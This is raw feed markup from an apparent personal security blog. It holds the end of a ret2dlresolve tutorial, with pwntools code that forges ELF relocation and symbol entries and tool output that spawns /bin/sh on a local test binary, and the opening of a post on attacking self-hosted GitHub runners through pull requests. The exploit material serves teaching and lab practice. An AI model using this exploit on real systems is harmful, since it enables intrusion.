&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_sym_entry&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_rel_entry&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[O] Structures set&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, we are also placing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; at the end, we will explain why in the next step.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Call _dl_resolve with the index pointing to our fake El64_Rel structure.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# We need to assert the address is divisible by Elf64_Rel size (24)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Launching dl_resolve... with rel at offset &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; - real &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RESOLVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Final stack addr at &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIVOTED_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;triggering-our-new-resolved-function&quot;&gt;Triggering our new resolved function&lt;/h3&gt;

&lt;p&gt;So you probably realized at this point that there is no more code after this. We simply jump in main again and it… works?&lt;/p&gt;

&lt;p&gt;The reason it works is because, if you remember, we set Elf64_Rel entry to point to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt;. This means when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; is executed
later on again it won’t call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   &lt;span class=&quot;mh&quot;&gt;0x000000000040117e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;lea&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0000000000401182&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x0000000000401185&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;All we need to do is to set rbp-0x10 to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; call and our shell is popped. That’s the reason why the last stack needs to be
set exactly +0x10 from where we left &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Note that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_resolve&lt;/code&gt; will call the resolve function when resolved. We could have simply put &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; and it would
have worked too but in our case that gadget did not exist so we had to take this route. Note that this other approach is
what pwntools aims to do when using their &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret2dlresolve&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;process &lt;span class=&quot;s1&quot;&gt;&apos;./test&apos;&lt;/span&gt;: pid 20091
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/home/litios/ret2libc/test&apos;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x400000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Stack pivoting performed to 0x404f10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; REL LIST ADDR: 0x400500
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SYM LIST ADDR: 0x4003d0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; STR LIST ADDR: 0x400448
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Setting &lt;span class=&quot;s2&quot;&gt;&quot;system&quot;&lt;/span&gt; at 0x404f20
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Setting El64_Sym at 0x404f30
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; String index at: 0x4ad8
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Setting El64_Rel at 0x404f40
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Replacing gets at: 0x404008
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Fake index is at: 0x324 :: final r_info: 0x32400000007
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;O] Structures &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Launching dl_resolve... with rel at offset 0x318 - real 0x4a40
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Final stack addr at 0x404f60
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;**************************************************&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; All &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; that was a &lt;span class=&quot;nb&quot;&gt;nice &lt;/span&gt;ride&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; here is your shell :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Switching to interactive mode

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;litios
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;Feel free to reach out if you spot any mistakes!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Happy hacking!&lt;/strong&gt;&lt;/p&gt;</content><author><name>David Fernandez</name></author><category term="Userspace" /><category term="Exploitation" /><summary type="html">. *.#@ **./@@ % (%*@ %, %..@ @ @% *.@..,,,,@@ .# %, . @. * #..,,,,....*/**%% #/% .@..@@@@@.**##*/ @ @(@* #,,@@@@....%%/.** @#/.........@@....,,..../, # ( /*....,,,,,,,,,,..../,/#@ @ *@#(........,*.%*../..@@..,,(/ @.......,,%/(,*(,,........../% # /.....,@/,#@.*.#. ( %@,,....(% ( @,.....@@@. .(@ ...( ( @#(,@@....*(@@ ,@,......* %#,(* @,,@/,#*@,....,%@ @.(....*,..*/.#(( (@@(@#.#@.....*. @ /@.,..../,.#.. @@@@@@@@/.*@....*,%% @@*%....*, % .@@@@@@@@ @. ,((.@,.@@, .*%%##(/.....,(#....@@@@@@@@@@@@@@,,* *....(% /*%.%%% @@,. @.@@...@@ @@@@@@@@@@./ % @@/* %%%%, . ...@..,,,,..(/% ...@@@....,,..@@@@@@(. (....... ..,,*,.@,.(%,.@@@@....,,,,..@@@@@.(/..........@@@(@ ,,..,,**,,**.* /...@@@....@@..@@@@@@@ #(....,,,@..,,..,@..(*...,@@....@@@@..@@@@ @/@....,,,,,,.. /@ **,,....,,,,**@.,......@@@@@@@ .@@@@..(/....*,,,,..*,,,*.%/#........@@@@@@@@,.@@@@/.@#,,..,,,,,,.#@ ,,../%,,,,,,@@@@,@...@@@@@@@@@@@@@@@.@/#@@...@@%.*/*,,,.,#%*......@@@@@@@@@@.....@. *@*,..(%*,@@,.@ ,(,... ..@@@....@@@@@@@@@@@@@@@@@..@@@@@*,.,/# /....* /@......@@@@@@@@@@... @@@@*.@.,. @, @#,... ..#@@....@@@@@@@@@@@@@@@@@./ @@@@*,(./#/*....%(/@......@@@@@@@@@@... @@@@/@@.@ ./, ..,.@@*. @@@@@..@@@@@@@@@@@@@@@@@.%/@@@@( %@*(*@....(,/@,.....@@@@@@@@@@... @@..(%@..@/,@ , @,@@...(@@. ...@@@@@@@@@...@@@@@@......%@, @@@@@@@.,.%......@@@@@@@@@@.. @@ (#/..,.#. , ,*.... /.@,.....@@@@@@.....@@@#.(,.....*%@@@#%.......,........@@@@@@....@@@@(*/@..,.*% ( .*.... *@.,.....@@@@@@.....@@@/#/.....( %. (.....,.%........@@@@@@....@@,. # @@.,.%# . %/.....,%@@@@.............@@@@# .@,,,,**.@...*((.,,.,*/*@...........@@@@@@,(,/..../,#% @%@....,,(@ ..@.. @@@@@@@@.@.#,,.*/**%. %@@.@##..,,.. @.. @@@@@@@@@@ #, @,.....%@ @ ,*....* .( (.*,,,, @(#(%@ ,,,,%#% .@ #,(@..,**,.@//@@....% @,((((..,,@./@,# @#,,....,%,*#(.@@@@@,*/.#.@#,,,,%%%@.@ .,@*...,.@(#%/@*@@ @@@@ ,, ...,,*,,#/. # @....,,..%/.,((/(%* @@@@@,,,,.%@@ %%%% . /,,%@@,@@...%**#.*, /./..,,,,,@.%% ,%%....,.,,.......... .,,* /* %%%%%%% .@ @#@..,...............,,**(%## ,@.*%/.@..........,,...(,#(@@ %%%%%%%% @@/.#/,((...............,,@*@( * ,/. .@........,,,,,,##@#. @ %%%%%%%% @@.%,, ,(%..............,,#( @ @@,@*@*#.*.@,*%#@%.(/% @ %%%%%%%%%% .,(,(*#(* #@ #/%,/ /%@@ @@@@ .... **,@ %%%%%%%%%%%% @ *..%#@@ ..@@.. @@ . (,@@@ %%%%%%%%%%%% @ (.,,(*@. ,/@@@@@ %%%%%%%%%%%% @ %#*..( . %%@ @@.@ %%%%%%%%%%%%% @@(,.. #.@ ,. %@% @@@%@ %%%%%%%%%%%% @@ @,.(/.@ . #(@ @@.@ @ %%%%%%%% @@@@.%/.%@... (#/ @@.@ @ %%%%%%%% @@@@%%@#@.(@( , *%% @@ %%%%%%%% % %%. #%/.@% @ @@ %% .@. @@.@ @@.@ %%%%%% @@ @(%. %.... %(, #%... .%*,@#((%,*# %@@ @@#.,(,# @###@.. *%,%%@@ . .%(( ...@...@(@ ,,#,#@.@@ @@@@%@*/(@, # ..... (.%% % * %..* /...%.@@@.. #@.#/###@@@@@@@@ ..//%(.#@ @...@... .( %#(.. #@...%(. @%%/................%# %%..@ %((*##%..................#*@%%% %%,%.#..*. /%*....@.# /* .................. . %#( ,*,# @@@.....................*%%( %*.......* %%,....... @.@%/....................# .. @@%*@..@........................ @#.. #,......# @/......................................#@%%%.......................................,% .................................... ./%%%.%(@..................................# ,% ,/ %................................ %................................. // * %#................................*/ @@% ,%..............................%. / ............................./% @(.#............................% *//..................,.#. . (@%%..................** % (,,.(%.%%%@..#. #..((%%% **@....#.@@..(..,@%*, %% @%%%,% @(.%@...%./,%%%%% %%.% %/.@.@...@%%%%(%(%%</summary></entry><entry><title type="html">Look mum, I’m the GitHub Runner</title><link href="http://0.0.0.0:4000/2024/05/01/cicd.html" rel="alternate" type="text/html" title="Look mum, I&apos;m the GitHub Runner" /><published>2024-05-01T00:00:00+02:00</published><updated>2024-05-01T00:00:00+02:00</updated><id>http://0.0.0.0:4000/2024/05/01/cicd</id><content type="html" xml:base="http://0.0.0.0:4000/2024/05/01/cicd.html">&lt;pre style=&quot;font-size: 1vw; text-align: center&quot;&gt;
**********************************************************************
**********************************************************************
**********************************************************************
**********************************************************************
*************************NX0kdollccccllodk0XN*************************
********************WNOdc;..             ...,cdONW********************
*****************WXkl,.                        .,lkX******************
***************WKo,.                              .,oKW***************
*************WKo&apos;                                    .oKW*************
************Nx,.    .,&apos;..                    ..&apos;,.     &apos;xN************
***********Xl.     .dNNKko;...&apos;,;;;;;;,&apos;...;okKNNd.     .lK***********
**********K:.      ,0*****WK0KXNWWWWWWNXK0KW*****0,      .:K**********
*********Xc.       &apos;O****************************O&apos;       .cX*********
********Wo.        ,0****************************0;        .oN********
********0,        ;0W****************************W0;.       ,0********
*******Wd.       .kW*******************************O&apos;       .dW*******
*******Nc        ;K********************************X:        cN*******
*******X:        ;K********************************X:        :X*******
*******Nc        &apos;0********************************0,        cN*******
*******Wo.       .oN******************************Wo.       .oW*******
********O&apos;        .xN****************************Wx.        &apos;O********
********Nl.        .c0W************************W0l.        .lN********
*********K;    &apos;;,.  .:dOXNW**************WNXOd:.          ;K*********
*********W0,  .,d0Ol.   ..,:oK**********Xd:,..            ,0W*********
**********W0;.  .;ONO;.    .oN**********No.             .;0W**********
************Xl.   &apos;kWNOdllokN************0,            .oX************
*************WO:.  .lOXNWWWWW************0,          .:OW*************
***************NO:.  ..,;;;lK************0,        .ckN***************
*****************W0o;.     ,0************0,     .;d0W*****************
********************N0xc,..:K************K:..,cx0N********************
************************NK0XW************WX0KN************************
**********************************************************************
**********************************************************************
**********************************************************************
**********************************************************************
&lt;/pre&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;In this article, I will explore the problems and dangers of using self-hosted GitHub runners in public repositories, as well as several attack vectors.&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;The other day, I was looking for ideas for a different kind of challenge for a future CTF I was organizing when my colleague Mark Esler (@eslerm) pointed me to &lt;a href=&quot;https://github.com/messypoutine/&quot;&gt;Messy poutine&lt;/a&gt;. It is a fun CTF-style GitHub organization that provides some vulnerable CI/CD jobs for which you need to collect some flags.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Go check their amazing talk on CI/CD 0-day analysis on OSS: 
&lt;strong&gt;Under the Radar: How we found 0-days in the Build Pipeline of OSS Packages&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;While taking a look at the &lt;a href=&quot;https://github.com/messypoutine/gravy-overflow/blob/main/.github/workflows/level2.yml&quot;&gt;last challenge&lt;/a&gt;, I researched a little bit more about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runs-on: self-hosted&lt;/code&gt;, which is not the most used runner when deploying CI/CD pipelines, thinking that the challenge may have something to do with this.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Fun fact: the actual challenge couldn’t be solved because the self-hosted container was not online but it pushed me to look forward&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With this in mind, I forked the repo, raised a self-hosted runner and started playing.&lt;/p&gt;

&lt;h2 id=&quot;attack-surface-pull-request&quot;&gt;Attack surface: pull request&lt;/h2&gt;

&lt;p&gt;The first thing I noticed is that the pipeline would trigger on a pull request.&lt;/p&gt;

&lt;p&gt;Now, can I create a PR updating from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;self-hosted&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ubuntu-latest&lt;/code&gt; and &lt;strong&gt;actually&lt;/strong&gt; execute the pipeline on the original repo? And it worked. Wow.&lt;/p&gt;

&lt;p&gt;From there, I read more about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ACTIONS_RUNNER_DEBUG: true&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ACTIONS_STEP_DEBUG: true&lt;/code&gt; which seemed like the intended solution but then it hit my mind: if it’s a pull request, why not update the pipeline itself?&lt;/p&gt;

